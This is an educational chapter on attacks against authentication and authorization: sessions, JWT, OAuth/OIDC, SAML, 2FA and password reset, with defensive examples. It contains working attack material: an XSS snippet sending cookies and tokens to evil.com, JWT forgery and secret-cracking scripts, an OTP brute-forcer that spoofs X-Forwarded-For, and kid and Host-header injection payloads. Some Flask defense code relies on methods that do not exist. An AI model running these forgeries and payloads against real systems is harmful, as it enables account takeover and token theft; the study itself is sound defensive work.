# Authentication & Authorization: Deep Technical Analysis

## 1. Session Management Attacks

### 1.1 Session Fixation

Session fixation forces a victim to use a session ID known to the attacker. The attack exploits applications that do not rotate session IDs at privilege escalation boundaries:

```http
# Attack scenario: Unauthorized session creation
# Step 1: Attacker obtains a valid session ID
GET /login HTTP/1.1
Host: target.com
→ Set-Cookie: session=ATTACKER_KNOWN_SESSION_ID; Path=/

# Step 2: Attacker crafts malicious link
https://target.com/login?session=ATTACKER_KNOWN_SESSION_ID

# Step 3: Victim clicks link and authenticates
POST /login HTTP/1.1
Cookie: session=ATTACKER_KNOWN_SESSION_ID
username=victim&password=victim_password

# Step 4: Server DOES NOT regenerate session ID after login
→ Set-Cookie: session=ATTACKER_KNOWN_SESSION_ID; Path=/
   (Same session ID, now authenticated)

# Step 5: Attacker uses the known session ID
GET /dashboard HTTP/1.1
Cookie: session=ATTACKER_KNOWN_SESSION_ID
→ Full access to victim's authenticated session
```

Session fixation variants:

```python
# Variant 1: URL-based session ID (PHP default)
# PHP accepts session ID in URL: ?PHPSESSID=attacker_session_id
# Attack: send link with fixed session ID in URL
https://target.com/login?PHPSESSID=attacker_fixed_id

# Variant 2: Cookie injection via subdomain
# If app.target.com can set cookies for .target.com:
# 1. Attacker controls evil.target.com
# 2. Attacker sets session cookie: Set-Cookie: session=attacker_id; Domain=.target.com
# 3. Victim visits target.com with attacker's session cookie
# 4. Victim logs in without session rotation
# 5. Attacker uses attacker_id to access victim's session

# Variant 3: Meta tag injection (XSS on subdomain)
# <meta http-equiv="Set-Cookie" content="session=attacker_id; path=/">
```

Defense — session rotation at every privilege change:

```python
# Secure session management (Flask)
from flask import session

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # CRITICAL: Regenerate session ID on login
        session.regenerate()  # Flask doesn't have this natively
        
        # Manual implementation:
        old_session = dict(session)  # Preserve session data
        session.clear()               # Clear old session
        session.update(old_session)   # Restore data in new session
        session['user_id'] = user.id  # Set authenticated state
        session['authenticated'] = True
        
        # Set secure cookie attributes
        response = redirect('/dashboard')
        response.set_cookie(
            'session', session.sid,
            secure=True,      # HTTPS only
            httponly=True,    # No JavaScript access
            samesite='Strict' # No cross-site sending
        )
        return response

@app.route('/logout')
def logout():
    session.clear()  # Destroy all session data
    # Invalidate the session ID on the server side
    session_store.delete(session.sid)
```

### 1.2 Session Hijacking

Session hijacking steals an authenticated session token from another user. Techniques range from network-level interception to client-side extraction:

```http
# Method 1: Network sniffing (unencrypted WiFi)
# Attacker on same WiFi captures session cookie:
Cookie: session=a3f2b7c9d1e4f6a8...

# Method 2: XSS token theft
<script>
  // Steal session cookie (only works if HttpOnly is NOT set)
  new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
  
  // Steal from localStorage (SPA tokens)
  new Image().src = 'https://evil.com/steal?token=' + localStorage.getItem('access_token');
  
  // Steal from sessionStorage
  new Image().src = 'https://evil.com/steal?token=' + sessionStorage.getItem('auth_token');
</script>

# Method 3: Predictable session IDs
# Weak PRNG: session ID = base64(user_id + timestamp)
# Attack: predict next session ID from observed sequence

# Method 4: Session sidejacking (Firesheep-style)
# On unencrypted WiFi, HTTP cookies are transmitted in cleartext:
GET /dashboard HTTP/1.1
Host: target.com
Cookie: session=victim_session_id_here
```

### 1.3 Session Prediction

```python
# Weak session ID generation examples

# Vulnerable: Sequential IDs
session_id = str(db.next_id())  # Predictable: 1, 2, 3, ...

# Vulnerable: MD5 hash of predictable data
import hashlib
session_id = hashlib.md5(f"{user_id}{timestamp}".encode()).hexdigest()
# If attacker knows user_id and approximate timestamp, can compute session_id

# Vulnerable: Insufficient entropy
import random
session_id = str(random.randint(0, 999999))  # Only 1M possible values

# Vulnerable: Time-based with small random component
import time, random
session_id = f"{int(time.time())}{random.randint(0, 999)}"
# Approximate timestamp + 1000 possible values = ~trivially brute-forceable

# Secure: Cryptographically random session ID
import secrets
session_id = secrets.token_hex(32)  # 256 bits of entropy, 64 hex characters
# Entropy: 2^256 possible values — infeasible to guess or brute-force
```

---

## 2. JSON Web Token Vulnerabilities

### 2.1 JWT Structure and Attack Surface

```
JWT Format: header.payload.signature

Header:    {"alg": "HS256", "typ": "JWT"}
Payload:   {"sub": "1234567890", "name": "John Doe", "role": "admin", "iat": 1516239022}
Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)

Example JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 2.2 Algorithm Confusion Attack (CVE-2016-10555)

The JWT specification allows asymmetric (RS256) or symmetric (HS256) algorithms. If a server uses RS256 but the attacker changes the algorithm to HS256, the public key (which is, well, public) becomes the HMAC secret:

```python
# Algorithm confusion attack
import jwt
import base64

# Step 1: Obtain the server's public key
# Often available at: /.well-known/jwks.json or /api/.well-known/openid-configuration
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArV7...atkQIDAQAB
-----END PUBLIC KEY-----"""

# Step 2: Craft a JWT with HS256 algorithm using the public key as HMAC secret
payload = {"sub": "admin", "role": "superadmin", "iat": 1516239022}
forged_token = jwt.encode(payload, public_key, algorithm="HS256")

# Step 3: Send the forged token
# If the server verifies using: jwt.decode(token, public_key, algorithms=["RS256", "HS256"])
# It will accept the HS256 token, verifying HMAC with the public key
headers = {"Authorization": f"Bearer {forged_token}"}
response = requests.get("https://target.com/api/admin/dashboard", headers=headers)
```

### 2.3 "none" Algorithm Attack

The JWT "none" algorithm indicates an unsigned token. Some implementations accept tokens with `alg: none` or `alg: None` or `alg: NONE`:

```python
# Forging a JWT with "none" algorithm
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).rstrip(b'=')

# JWT with empty signature
forged_token = f"{header.decode()}.{payload.decode()}."

# Variations to bypass filters:
# alg: "none"    → typ: "JWT", alg: "none"
# alg: "None"    → typ: "JWT", alg: "None"
# alg: "NONE"    → typ: "JWT", alg: "NONE"
# alg: "nOnE"    → Mixed case bypass

# Using jwt library:
token = jwt.encode({"sub": "admin", "role": "admin"}, key="", algorithm="none")
```

### 2.4 Weak Signing Secret

```python
# Brute-forcing HS256 JWT secret
import jwt
import hashlib

# Common weak secrets to try
weak_secrets = [
    "secret", "password", "123456", "jwt_secret",
    "your-256-bit-secret",  # Default in many tutorials
    "super_secret", "secret_key", "my_secret",
    "key", "salt", "password123", "secret123",
    # ... exhaustive wordlists available in jwt-secrets repositories
]

token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.w_lAqu0J9k3YdFMWd4LJj9D3G1d2H3e4f5g6h7i8j9k0"

for secret in weak_secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Secret found: {secret}")
        print(f"[+] Decoded payload: {decoded}")
        # Now forge arbitrary tokens
        forged = jwt.encode({"sub": "admin", "role": "admin"}, secret, algorithm="HS256")
        break
    except jwt.InvalidSignatureError:
        continue

# Hashcat JWT cracking (much faster for exhaustive attack)
# Format: hashcat -m 16500 jwt_hash.txt wordlist.txt
# hashcat -m 16500 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.w_lAqu0J9k3YdFMWd4LJj9D3G1d2H3e4f5g6h7i8j9k0' rockyou.txt
```

### 2.5 JKU/X5U Header Injection

JWT headers can specify the key source via `jku` (JWK Set URL) or `x5u` (X.509 URL) claims:

```json
// Legitimate JWT header:
{"alg": "RS256", "typ": "JWT", "kid": "key-1"}

// Attacker-controlled JKU:
{"alg": "RS256", "typ": "JWT", "jku": "https://evil.com/jwks.json"}

// Attacker-controlled X5U:
{"alg": "RS256", "typ": "JWT", "x5u": "https://evil.com/cert.pem"}
```

Attack flow:
1. Attacker generates their own RSA key pair
2. Attacker hosts the public key at `https://evil.com/jwks.json`
3. Attacker creates a JWT signed with their private key
4. JWT header specifies `"jku": "https://evil.com/jwks.json"`
5. If the server doesn't whitelist JKU URLs, it fetches the attacker's key
6. Server verifies signature using the attacker's public key (matching the attacker's private key)
7. Attacker is authenticated with arbitrary claims

```json
// Attacker's jwks.json hosted at evil.com
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "attacker-key-1",
      "n": "attacker_public_key_modulus...",
      "e": "AQAB",
      "alg": "RS256"
    }
  ]
}
```

### 2.6 "kid" Path Traversal

The `kid` (Key ID) header claim identifies which key to use. If the application uses `kid` to construct a file path without sanitization:

```python
# Vulnerable: kid used in file path
def verify_jwt(token):
    header = decode_header(token)
    kid = header.get('kid', 'default')
    key_path = f"/etc/jwt_keys/{kid}.pem"  # Path traversal vulnerability!
    with open(key_path) as f:
        public_key = f.read()
    return jwt.decode(token, public_key, algorithms=["RS256"])

# Attack: kid = "../../dev/null" (empty file = trivially verifiable)
# Header: {"alg": "HS256", "kid": "../../dev/null"}
# The server opens /etc/jwt_keys/../../dev/null.pem → /dev/null.pem
# If /dev/null.pem doesn't exist, error; but if kid traversal reaches a known empty file:

# Attack: kid = "../../proc/self/environ" 
# Leak environment variables (potentially containing secrets)

# Attack: kid manipulation to use a known key
# Header: {"alg": "HS256", "kid": "known-key-id"}
# If the attacker knows the HS256 key for that kid
```

---

## 3. OAuth 2.0 Pitfalls

### 3.1 OAuth 2.0 Authorization Code Flow

The authorization code flow is the most secure OAuth flow, but implementation flaws can be devastating:

```
Normal OAuth 2.0 Flow:
1. Client redirects user to: /authorize?response_type=code&client_id=xxx&redirect_uri=https://client.com/callback&state=xyz&scope=read
2. User authenticates and grants consent
3. Authorization server redirects to: https://client.com/callback?code=AUTH_CODE&state=xyz
4. Client exchanges AUTH_CODE for tokens: POST /token (code=AUTH_CODE, client_id=xxx, client_secret=yyy, redirect_uri=https://client.com/callback)
5. Authorization server returns: {access_token, refresh_token, id_token}
```

### 3.2 Redirect URI Manipulation

The `redirect_uri` is the single most critical parameter in OAuth security:

```http
# Vulnerable: Redirect URI not strictly validated
# Registered redirect_uri: https://client.com/callback
# Attacker manipulates to:
https://client.com/callback.evil.com           → Different domain (should be rejected)
https://client.com/callback/../../evil          → Path traversal
https://client.com/callback?redirect=https://evil.com → Open redirect parameter
https://client.com/callback%23.evil.com         → Fragment injection
https://client.com/callback%2F.evil.com         → URL encoding bypass
https://client.com/callback/.evil.com           → Subdomain injection
https://client.com/callback%0a.evil.com         → Newline injection
https://user@evil.com@client.com/callback       → Userinfo confusion
```

Attack scenario - redirect URI with open redirect:

```
1. Attacker initiates OAuth flow with manipulated redirect_uri:
   https://auth.target.com/authorize?response_type=code&client_id=xxx&redirect_uri=https://client.com/callback?next=https://evil.com

2. User authenticates, authorization code is sent to:
   https://client.com/callback?next=https://evil.com&code=AUTH_CODE

3. Client application processes the request but redirects to:
   https://evil.com?code=AUTH_CODE

4. Attacker captures the authorization code from evil.com
5. Attacker exchanges code for tokens: POST /token {code: AUTH_CODE, ...}
```

### 3.3 Authorization Code Interception

Authorization codes can be intercepted and misused:

```python
# PKCE (Proof Key for Code Exchange) prevents code interception
import hashlib
import base64
import secrets

# Step 1: Client generates code_verifier and code_challenge
code_verifier = secrets.token_urlsafe(32)  # 43-128 chars
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b'=').decode()

# Step 2: Authorization request includes code_challenge
auth_url = (
    f"https://auth.server.com/authorize?"
    f"response_type=code&client_id={client_id}&"
    f"redirect_uri={redirect_uri}&"
    f"code_challenge={code_challenge}&"
    f"code_challenge_method=S256&"
    f"scope=openid+profile+email&"
    f"state={state}"
)

# Step 3: Token exchange includes code_verifier
token_response = requests.post(
    "https://auth.server.com/token",
    data={
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": redirect_uri,
        "client_id": client_id,
        "code_verifier": code_verifier,  # Server verifies SHA256(code_verifier) == code_challenge
    }
)
# Without code_verifier, even a stolen authorization code is useless
```

### 3.4 PKCE Bypass Techniques

```python
# Bypass 1: Code challenge method downgrade
# If server accepts "plain" method:
code_challenge_method = "plain"
code_challenge = code_verifier  # No hashing! SHA256 not required
# Attack: If client sends code_challenge_method=plain, attacker who intercepts the
# code can use the code_challenge value directly as code_verifier

# Bypass 2: Failure to verify PKCE at token endpoint
# Some implementations validate PKCE at the authorize endpoint but not at the token endpoint
# Attacker steals authorization code and exchanges it without code_verifier
# Server issues tokens without verifying PKCE

# Bypass 3: Reusing code_verifier across sessions
# If code_verifier is static (not per-session), it can be reused by an attacker
```

### 3.5 OAuth Token Leakage

```http
# Token leakage via Referer header
# Step 1: User clicks OAuth login link
# Step 2: After authentication, redirect to:
https://client.com/callback?access_token=eyJ...&state=xyz

# Step 3: If client.com has external resources (images, scripts):
GET /callback?access_token=eyJ...&state=xyz HTTP/1.1
Referer: https://client.com/callback?access_token=eyJ...&state=xyz

# Step 4: Referer header leaks access_token to third-party domains

# Token leakage via logs
# Access tokens in URL parameters are logged by:
# - Web server access logs
# - Proxy server logs
# - Browser history
# - Referrer headers to external sites

# Defense: Use authorization code flow (token in POST body, not URL)
# Never use implicit flow (response_type=token) which puts tokens in URLs
```

---

## 4. OpenID Connect (OIDC) Attacks

### 4.1 ID Token Forgery

OIDC adds an ID token (JWT) to the OAuth 2.0 flow. The ID token contains user identity claims and must be validated:

```python
# Critical ID token validation steps (often skipped)
import jwt
from jwt import PyJWKClient

def validate_id_token(id_token, client_id, issuer):
    # 1. Verify signature using the issuer's JWKS
    jwks_client = PyJWKClient(f"{issuer}/.well-known/jwks.json")
    signing_key = jwks_client.get_signing_key_from_jwt(id_token)
    
    decoded = jwt.decode(
        id_token,
        signing_key.key,
        algorithms=["RS256"],
        audience=client_id,      # 2. Verify audience matches client_id
        issuer=issuer,           # 3. Verify issuer matches expected issuer
    )
    
    # 4. Verify nonce matches the one sent in authorization request
    if decoded.get('nonce') != session['oauth_nonce']:
        raise InvalidTokenError("Nonce mismatch")
    
    # 5. Verify token hasn't expired
    if decoded.get('exp', 0) < time.time():
        raise InvalidTokenError("Token expired")
    
    # 6. Verify iat (issued at) is within acceptable window
    if decoded.get('iat', 0) < time.time() - 300:  # Not older than 5 minutes
        raise InvalidTokenError("Token too old")
    
    # 7. Verify at_hash if present (binds ID token to access token)
    # at_hash = base64urlencode(sha256(access_token)[:128bits])
    
    return decoded
```

### 4.2 OIDC Discovery Manipulation

```http
# OpenID Connect Discovery document
GET /.well-known/openid-configuration HTTP/1.1
Host: auth.target.com

{
  "issuer": "https://auth.target.com",
  "authorization_endpoint": "https://auth.target.com/authorize",
  "token_endpoint": "https://auth.target.com/token",
  "userinfo_endpoint": "https://auth.target.com/userinfo",
  "jwks_uri": "https://auth.target.com/.well-known/jwks.json",
  "end_session_endpoint": "https://auth.target.com/logout"
}

# Attack: If the client doesn't verify issuer in the discovery document,
# an attacker can host a malicious OIDC provider:
{
  "issuer": "https://evil.com",
  "authorization_endpoint": "https://evil.com/authorize",
  "token_endpoint": "https://evil.com/token",
  "jwks_uri": "https://evil.com/jwks.json"
}
```

---

## 5. SAML Vulnerabilities

### 5.1 XML Signature Wrapping (XSW)

SAML (Security Assertion Markup Language) uses XML signatures to verify assertion integrity. XML signature wrapping attacks exploit inconsistencies in how signature verification and assertion processing handle the XML document:

```xml
<!-- Original SAML assertion -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_response1">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assertion1">
    <saml:Subject>
      <saml:NameID>legitimate@example.com</saml:NameID>
    </saml:Subject>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:Reference URI="#_assertion1">
          <!-- Signature references assertion1, which contains legitimate user -->
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>...</ds:SignatureValue>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>

<!-- XSW Attack: Insert malicious assertion, move legitimate assertion into wrapper -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_response1">
  <!-- Attacker's assertion (NOT signed, but processed first) -->
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assertion_evil">
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  
  <!-- Wrapper containing the legitimately signed assertion -->
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assertion1">
    <saml:Subject>
      <saml:NameID>legitimate@example.com</saml:NameID>
    </saml:Subject>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:Reference URI="#_assertion1">
          <!-- Signature still valid: references _assertion1 with legitimate user -->
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>...</ds:SignatureValue>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>

<!-- If the SAML consumer:
     1. Verifies signature (finds valid signature for _assertion1) ✓
     2. Processes first assertion in document order (_assertion_evil) ✗
     → Attacker is authenticated as attacker@evil.com with a "valid" signature -->
```

XSW variants identified by research (Somorovsky et al., 2012):

```
XSW1:  Move signed assertion into wrapper, insert attacker assertion before wrapper
XSW2:  Move signed assertion into wrapper, insert attacker assertion after wrapper
XSW3:  Insert attacker assertion as sibling, modify IDs
XSW4:  Copy signature to attacker assertion (invalid signature but some libraries don't verify)
XSW5:  Modify assertion content while preserving signature reference structure
XSW6:  Insert attacker assertion as child of signed assertion
XSW7:  Extensible wrapper using SAML extension elements
XSW8:  Namespace confusion between SAML versions
```

### 5.2 SAML Comment Injection

```xml
<!-- SAML comment injection bypasses signature verification -->
<!-- XML canonicalization removes comments, but some parsers process them -->

<!-- Original NameID -->
<saml:NameID>admin@example.com</saml:NameID>

<!-- Attack: Insert comment to change perceived value -->
<saml:NameID>attacker<!-- -->@example.com</saml:NameID>
<!-- Parser reads: attacker@example.com -->
<!-- Canonicalization for signature: attacker@example.com (comment removed) -->
<!-- But some implementations include the comment in processing -->
```

### 5.3 SAML Assertion Replay

```python
# SAML assertion replay attack
# Step 1: Capture a valid SAML assertion (e.g., via proxy)
# Step 2: Replay the assertion at a different service provider
# Step 3: If the service provider doesn't validate:
#   - NotOnOrAfter condition
#   - AudienceRestriction
#   - Assertion ID uniqueness (replay detection)
# The assertion may be accepted

# Defense: Store assertion IDs and reject duplicates
assertion_store = set()

def validate_assertion(assertion):
    # Check for replay
    if assertion.id in assertion_store:
        raise ReplayError(f"Assertion {assertion.id} already used")
    assertion_store.add(assertion.id)
    
    # Check timestamp
    if assertion.conditions.not_on_or_after < datetime.utcnow():
        raise ExpiredError("Assertion expired")
    
    # Check audience
    if assertion.conditions.audience != config.SAML_ENTITY_ID:
        raise AudienceError("Assertion not intended for this service provider")
```

---

## 6. Two-Factor Authentication Bypass

### 6.1 2FA Bypass Techniques

```http
# Bypass 1: Direct API access without 2FA verification
# Workflow:
# 1. POST /api/auth/login (username/password) → 200 OK, session created
# 2. POST /api/auth/2fa (OTP code) → 200 OK, session fully authenticated
#
# Attack: After step 1, directly access protected endpoints
GET /api/user/profile HTTP/1.1
Cookie: session=partially_authenticated_session
→ 200 OK (should require 2FA but endpoint doesn't check)

# Bypass 2: Response manipulation
# Server response after 2FA check:
HTTP/1.1 401 Unauthorized
{"status": "failed", "authenticated": false}

# Attacker modifies response:
HTTP/1.1 200 OK
{"status": "success", "authenticated": true}

# Bypass 3: Brute force 2FA code
# Many services use 4-6 digit OTP codes with insufficient rate limiting
# 6-digit OTP: 1,000,000 combinations
# With rate limit of 10/minute: 1,000,000 / 10 = 100,000 minutes (too slow)
# But if rate limit resets after correct password entry:
#   1. Login with valid credentials
#   2. Try 10 OTP codes
#   3. Login again (resets rate limit)
#   4. Try 10 more OTP codes
#   At 10 attempts per login: need 100,000 logins (still slow)
# But if rate limit is per-hour: brute force is feasible

# Bypass 4: OTP reuse
# Some systems don't invalidate OTP after successful use
# Attack: Replay the same valid OTP code

# Bypass 5: OTP leakage in response
# Vulnerable 2FA implementation returns OTP in response:
POST /api/auth/2fa HTTP/1.1
Cookie: session=abc123
{"otp": "000000"}  → {"error": "Invalid code"}

# But 2FA setup endpoint leaks the code:
POST /api/auth/2fa/setup HTTP/1.1
Cookie: session=abc123
→ {"otp_secret": "JBSWY3DPEHPK3PXP", "backup_codes": ["123456", "234567", ...]}
```

### 6.2 OTP Brute Force

```python
# Optimized OTP brute force with rate limit bypass
import requests
import itertools

def brute_force_otp(session_token, max_attempts=1000):
    """Brute force OTP with rate limiting considerations."""
    session = requests.Session()
    session.headers.update({"Cookie": f"session={session_token}"})
    
    for attempt, code in enumerate(itertools.product(range(10), repeat=6)):
        otp = ''.join(map(str, code))
        resp = session.post("https://target.com/api/auth/2fa", 
                          json={"otp": otp})
        
        if resp.status_code == 200:
            print(f"[+] Valid OTP: {otp}")
            return otp
        
        if resp.status_code == 429:
            # Rate limited — wait and retry
            retry_after = int(resp.headers.get('Retry-After', 60))
            time.sleep(retry_after)
            continue
        
        # Rate limit bypass: try different IP (if behind proxy)
        if attempt % 10 == 0:
            session.headers.update({
                'X-Forwarded-For': f'10.0.{attempt // 256}.{attempt % 256}'
            })
```

---

## 7. Password Reset Flaws

### 7.1 Password Reset Token Vulnerabilities

```http
# Vulnerability 1: Predictable reset tokens
# Token based on timestamp:
# token = md5(user_id + current_timestamp)
# Attack: predict timestamp and compute md5

# Vulnerability 2: Reset token not invalidated after use
# Step 1: Request reset token → token_abc123
# Step 2: Use token to reset password → success
# Step 3: Attacker uses same token again → success (token should be invalidated)

# Vulnerability 3: Reset token sent in URL (not secure)
# Email contains: https://target.com/reset?token=abc123
# Token may be logged by:
# - Browser history
# - Proxy logs
# - Referer header (if reset page has external resources)
# - Email provider (scanning URLs for security)

# Vulnerability 4: Reset token as password hash
# Some systems use: token = md5(password_hash)
# Attack: if token is disclosed, attacker can crack password hash directly
```

```python
# Vulnerability 5: Password reset with user enumeration
@app.route('/reset-password', methods=['POST'])
def reset_password():
    email = request.form['email']
    user = User.query.filter_by(email=email).first()
    if user:
        send_reset_email(user)
        return jsonify({"message": "Reset email sent to your address"})
    else:
        return jsonify({"error": "No account found with that email"}), 404
# This reveals whether an email is registered

# Secure: Same response regardless of whether email exists
@app.route('/reset-password', methods=['POST'])
def reset_password():
    email = request.form['email']
    user = User.query.filter_by(email=email).first()
    if user:
        send_reset_email(user)
    # Always return success, even if email doesn't exist
    return jsonify({"message": "If an account exists with that email, a reset link has been sent"})
```

### 7.2 Password Reset Poisoning

```http
# Vulnerability 6: Host header injection in password reset
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@target.com"}

# If the server constructs the reset link using the Host header:
reset_link = f"https://{request.headers['Host']}/reset?token={token}"
# Result: https://evil.com/reset?token=abc123
# Victim clicks link → token sent to attacker

# Defense: Never trust Host header for URL construction
# Use configured base URL instead:
reset_link = f"{config.BASE_URL}/reset?token={token}"
```

---

## 8. API Key Exposure

```http
# Common API key exposure locations

# 1. Client-side JavaScript (most common)
<script>
const API_KEY = "sk-live-4242424242424242";  // Visible in page source
const MAPS_KEY = "AIzaSyD4Gl4...";            // Google Maps API key
</script>

# 2. Source maps in production
# webpack://~/src/config.js
export const API_URL = "https://api.target.com";
export const SECRET_KEY = "sk-live-1234567890";

# 3. Git repository exposure
GET /.git/config HTTP/1.1
→ [core]
   repositoryformatversion = 0
   filemode = true
   bare = false
   url = https://github.com/company/private-repo.git

# 4. Environment file exposure
GET /.env HTTP/1.1
→ DB_PASSWORD=supersecretpassword
   AWS_SECRET_ACCESS_KEY=...
   STRIPE_API_KEY=sk_live_...

# 5. Swagger/OpenAPI documentation
GET /swagger-ui.html HTTP/1.1
GET /api-docs HTTP/1.1
GET /v2/api-docs HTTP/1.1

# 6. Public repositories (GitHub code search)
# site:github.com "sk_live" OR "sk_live_" OR "API_KEY" OR "AWS_SECRET_ACCESS_KEY"
```

---

## 9. Authorization Models

### 9.1 RBAC (Role-Based Access Control)

```python
# RBAC: Users are assigned roles, roles have permissions
# User → Role → Permission

role_permissions = {
    'viewer': ['read:documents', 'read:reports'],
    'editor': ['read:documents', 'write:documents', 'read:reports'],
    'admin': ['read:documents', 'write:documents', 'delete:documents', 
              'read:reports', 'write:reports', 'manage:users'],
}

def check_permission(user, required_permission):
    user_role = user.role  # e.g., 'editor'
    if required_permission in role_permissions.get(user_role, []):
        return True
    return False

# RBAC limitations:
# - Role explosion: many roles needed for fine-grained access
# - Cannot express contextual rules (e.g., "edit own documents only")
# - Difficult to implement least privilege without over-provisioning
```

### 9.2 ABAC (Attribute-Based Access Control)

```python
# ABAC: Access decisions based on attributes of subject, resource, action, and environment
# More flexible than RBAC but more complex

from datetime import datetime

def check_access(subject, action, resource, environment):
    """ABAC policy evaluation."""
    
    # Policy: Employees can read documents in their department during business hours
    if (subject.role == 'employee' and 
        action == 'read' and 
        resource.type == 'document' and
        resource.department == subject.department and
        9 <= environment.time.hour <= 17 and
        environment.time.weekday() < 5):
        return True
    
    # Policy: Managers can approve expenses under $5000
    if (subject.role == 'manager' and
        action == 'approve' and
        resource.type == 'expense' and
        resource.amount < 5000 and
        resource.department == subject.department):
        return True
    
    # Policy: Admins can access anything during business hours from company IP
    if (subject.role == 'admin' and
        environment.ip_address.startswith('10.0.') and
        environment.time.weekday() < 5):
        return True
    
    return False

# ABAC in AWS IAM (real-world example)
# {
#   "Version": "2012-10-17",
#   "Statement": [{
#     "Effect": "Allow",
#     "Action": "s3:GetObject",
#     "Resource": "arn:aws:s3:::my-bucket/*",
#     "Condition": {
#       "StringEquals": {"s3:prefix": "${aws:username}/"},
#       "IpAddress": {"aws:SourceIp": ["10.0.0.0/8"]},
#       "DateGreaterThan": {"aws:CurrentTime": "2023-01-01T00:00:00Z"}
#     }
#   }]
# }
```

### 9.3 ReBAC (Relationship-Based Access Control)

```python
# ReBAC: Access based on relationships between entities (Google Zanzibar model)
# Implemented in systems like Authzed SpiceDB, Ory Keto, OpenPolicyAgent

# Relationship tuples define the graph of permissions:
# (user:alice, owner, document:report1)
# (user:bob, editor, document:report1)
# (user:carol, viewer, document:report1)
# (group:engineering, member, user:bob)
# (document:report1, parent, folder:engineering)

# Check: Can user:bob write document:report1?
# Traverse relationships: bob → editor → report1 → write ✓
# Or: bob → member → engineering → parent → report1 → write?

# ReBAC excels at:
# - Hierarchical permissions (folder → document → section)
# - Group/team membership
# - Delegation (user delegates permission to another user)
# - Multi-tenant systems

# Example SpiceDB schema:
# definition user {}
# definition document {
#   relation owner: user
#   relation editor: user
#   relation viewer: user
#   permission write = owner + editor
#   permission read = write + viewer
# }
```

---

## Cross-Reference Guide

| Topic | Cross-Reference |
|-------|-----------------|
| JWT vulnerabilities | This chapter (Section 2) |
| OAuth/OIDC attacks | This chapter (Sections 3-4) |
| SAML attacks | This chapter (Section 5) |
| Session management | This chapter (Section 1) |
| CORS and SOP | `01a_web_architecture_attack_surface.md` |
| SSRF for key exfiltration | `03a_ssrf_csrflfi.md` |
| XSS for token theft | `04a_client_side_security.md` |
| Deserialization in auth | `04b_deserialization_race_conditions.md` |
| API authentication bypass | `03b_api_security.md` |
| Testing methodology | `06a_web_security_testing.md` |
| Hardening and defense | `06b_web_hardening_defense.md` |

---

*Authentication and authorization failures remain the most direct path to account takeover and data breach. JWT, OAuth, and SAML each carry their own attack surface, and the trend toward federated identity management introduces trust boundaries that must be carefully validated at every step.*

---

## References

1. OWASP Foundation. "Authentication Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
2. OWASP Foundation. "Session Management Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
3. Jones, M., Bradley, J., Sakimura, N. "JSON Web Token (JWT) RFC 7519." IETF, May 2015. https://www.rfc-editor.org/rfc/rfc7519
4. Hardt, D. "The OAuth 2.0 Authorization Framework RFC 6749." IETF, October 2012. https://www.rfc-editor.org/rfc/rfc6749
5. Sakimura, N., Bradley, J., Jones, M., et al. "OpenID Connect Core 1.0." OpenID Foundation, 2014. https://openid.net/specs/openid-connect-core-1_0.html
6. Cantor, S., Kemp, J., Philpott, R., Maler, E. "Assertions and Protocols for the OASIS SAML V2.0 (SAML Core)." OASIS Standard, 2005. https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf
7. PortSwigger Ltd. "JWT Attacks." https://portswigger.net/web-security/jwt
8. OAuth 2.0 Security Workshop. "OAuth 2.0 Threat Model and Security Considerations RFC 6819." IETF, 2013. https://www.rfc-editor.org/rfc/rfc6819
9. NIST. "SP 800-63B: Digital Identity Guidelines — Authentication and Lifecycle Management." https://pages.nist.gov/800-63-3/sp800-63b.html
10. McLean, T. "JWT Attack Walkthrough." https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature